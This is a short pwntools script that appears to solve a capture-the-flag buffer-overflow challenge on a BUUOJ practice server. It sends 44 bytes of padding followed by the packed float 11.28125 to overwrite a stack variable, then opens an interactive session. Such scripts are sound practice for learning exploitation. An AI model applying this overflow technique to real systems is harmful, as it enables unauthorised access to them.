from pwn import *
import struct

num = 11.28125

data = struct.pack('f', num)
print(data.hex())

func = 0x41348000

r = remote('node5.buuoj.cn', 27095)

r.sendline(b'a' * 44 + p64(func))

r.interactive()
